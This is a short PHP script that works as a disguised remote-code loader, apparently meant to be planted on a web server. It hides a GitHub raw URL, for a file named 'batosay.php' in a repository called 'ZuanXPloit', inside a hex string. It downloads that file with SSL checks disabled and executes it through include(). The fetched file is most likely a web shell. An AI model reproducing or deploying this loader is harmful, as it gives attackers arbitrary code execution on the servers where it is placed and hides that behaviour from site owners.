<?php
$h = '68747470733a2f2f7261772e6769746875622e636f6d2f5a75616e58506c6f69742f546573742f726566732f68656164732f6d61737465722f6261746f7361792e706870';

$f = function ($x) {
    $s = '';
    for ($i = 0; $i < strlen($x) - 1; $i += 2) {
        $s .= chr(hexdec($x[$i] . $x[$i + 1]));
    }
    return $s;
};

$u = $f($h);

$d = @file_get_contents($u);
if (!$d && function_exists('curl_init')) {
    $c = curl_init($u);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
    $d = curl_exec($c);
    curl_close($c);
}

if ($d) {
    $r = tmpfile();
    fwrite($r, $d);
    fseek($r, 0);
    include stream_get_meta_data($r)['uri'];
    fclose($r);
} else {
    echo "Download gagal.";
}
?>